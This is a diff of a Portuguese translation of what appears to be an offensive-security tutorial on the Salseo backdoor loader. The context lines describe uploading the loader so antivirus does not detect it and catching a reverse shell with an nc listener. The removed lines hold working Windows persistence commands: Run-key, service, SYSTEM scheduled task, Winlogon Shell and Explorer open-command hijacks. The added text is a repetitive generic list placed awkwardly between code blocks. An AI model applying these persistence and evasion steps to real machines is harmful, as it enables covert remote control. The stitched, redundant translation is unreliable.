@@ -39,52 +39,47 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 # Backdoors em Windows
 
-Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são discutidas abaixo.
+Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle total sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são discutidas abaixo.
 
-## 1. Porta dos fundos do Registro do Windows
+## 1. Backdoors baseados em porta
 
-O Registro do Windows é um banco de dados que armazena configurações e informações importantes do sistema operacional. Um invasor pode criar uma entrada no Registro para executar um programa malicioso sempre que o sistema for iniciado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
+Os backdoors baseados em porta são criados abrindo uma porta de comunicação em um sistema Windows comprometido. Isso permite que o invasor se conecte remotamente ao sistema usando essa porta e execute comandos ou acesse arquivos e recursos do sistema.
 
-```powershell
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Nome do Programa" /t REG_SZ /d "C:\Caminho\para\programa.exe"
-```
+## 2. Backdoors baseados em serviço
 
-## 2. Backdoor do Serviço do Windows
+Os backdoors baseados em serviço são criados instalando um serviço malicioso no sistema Windows comprometido. Esse serviço é executado em segundo plano e permite que o invasor mantenha acesso persistente ao sistema, mesmo após reinicializações.
 
-Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidades específicas para o sistema operacional. Um invasor pode criar um serviço malicioso que seja executado automaticamente quando o sistema é inicializado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
+## 3. Backdoors baseados em registro
 
-```powershell
-sc create "Nome do Serviço" binPath= "C:\Caminho\para\programa.exe" start= auto
-sc start "Nome do Serviço"
-```
+Os backdoors baseados em registro são criados adicionando entradas maliciosas ao registro do sistema Windows comprometido. Essas entradas são configuradas para serem executadas sempre que o sistema é inicializado, permitindo que o invasor mantenha acesso persistente ao sistema.
 
-## 3. Backdoor do Agendador de Tarefas
+## 4. Backdoors baseados em arquivo
 
-O Agendador de Tarefas do Windows permite que os usuários programem a execução automática de programas ou scripts em horários específicos. Um invasor pode criar uma tarefa agendada para executar um programa malicioso sempre que o sistema é inicializado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
+Os backdoors baseados em arquivo são criados adicionando um arquivo malicioso ao sistema Windows comprometido. Esse arquivo é configurado para ser executado sempre que o sistema é inicializado, permitindo que o invasor mantenha acesso persistente ao sistema.
 
-```powershell
-schtasks /create /tn "Nome da Tarefa" /tr "C:\Caminho\para\programa.exe" /sc onstart /ru "SYSTEM"
-schtasks /run /tn "Nome da Tarefa"
-```
+## 5. Backdoors baseados em DLL
 
-## 4. Backdoor do Shell do Windows
+Os backdoors baseados em DLL são criados substituindo uma DLL legítima do sistema Windows comprometido por uma DLL maliciosa. Essa DLL maliciosa é carregada sempre que um programa usa a DLL legítima, permitindo que o invasor execute comandos ou acesse recursos do sistema.
 
-O Shell do Windows é a interface gráfica do usuário que permite aos usuários interagir com o sistema operacional. Um invasor pode modificar as configurações do Shell para executar um programa malicioso sempre que um usuário faz login no sistema. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
+## 6. Backdoors baseados em chave de registro
 
-```powershell
-reg add HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v "Shell" /t REG_SZ /d "C:\Caminho\para\programa.exe"
-```
+Os backdoors baseados em chave de registro são criados adicionando uma chave de registro maliciosa ao sistema Windows comprometido. Essa chave de registro é configurada para ser executada sempre que o sistema é inicializado, permitindo que o invasor mantenha acesso persistente ao sistema.
 
-## 5. Backdoor do Explorador do Windows
+## 7. Backdoors baseados em agendador de tarefas
 
-O Explorador do Windows é o gerenciador de arquivos padrão do sistema operacional. Um invasor pode modificar as configurações do Explorador para executar um programa malicioso sempre que um usuário abre uma pasta ou um arquivo específico. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
+Os backdoors baseados em agendador de tarefas são criados adicionando uma tarefa maliciosa ao agendador de tarefas do sistema Windows comprometido. Essa tarefa é configurada para ser executada em intervalos regulares, permitindo que o invasor mantenha acesso persistente ao sistema.
 
-```powershell
-reg add HKCR\Directory\shell\open\command /ve /t REG_SZ /d "C:\Caminho\para\programa.exe"
-reg add HKCR\*\shell\open\command /ve /t REG_SZ /d "C:\Caminho\para\programa.exe"
-```
+## 8. Backdoors baseados em driver
 
-Essas são apenas algumas das técnicas comuns usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra possíveis ataques.
+Os backdoors baseados em driver são criados instalando um driver malicioso no sistema Windows comprometido. Esse driver é carregado sempre que o sistema é inicializado, permitindo que o invasor execute comandos ou acesse recursos do sistema.
+
+## 9. Backdoors baseados em rootkit
+
+Os backdoors baseados em rootkit são criados instalando um rootkit no sistema Windows comprometido. Um rootkit é um conjunto de ferramentas e técnicas que permite ao invasor ocultar sua presença no sistema, tornando difícil a detecção e remoção do backdoor.
+
+## 10. Backdoors baseados em malware
+
+Os backdoors baseados em malware são criados instalando um malware no sistema Windows comprometido. Esse malware pode ser projetado para abrir uma porta de comunicação, instalar um serviço malicioso ou executar outras ações que permitem ao invasor manter acesso persistente ao sistema.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -93,9 +88,9 @@ Ok, agora você tem tudo o que precisa para executar todo o processo de Salseo: 
 
 **Faça o upload do binário SalseoLoader.exe para a máquina. Eles não devem ser detectados por nenhum AV...**
 
-## **Executando a backdoor**
+## **Executando a porta dos fundos**
 
-### **Obtendo um shell reverso TCP (baixando o dll codificado por HTTP)**
+### **Obtendo um shell reverso TCP (baixando a dll codificada por HTTP)**
 
 Lembre-se de iniciar um nc como ouvinte de shell reverso e um servidor HTTP para servir o evilsalsa codificado.
 ```
@@ -140,21 +135,21 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)
 
 Na pasta do seu projeto, aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
 
-### **D**esinstale o DllExport
+### **Desinstale o DllExport**
 
 Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)
 
@@ -186,7 +181,7 @@ Selecione a **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Com
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)
+Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, aparecerá o caminho da nova DLL)
 
 ### Teste a DLL gerada
 
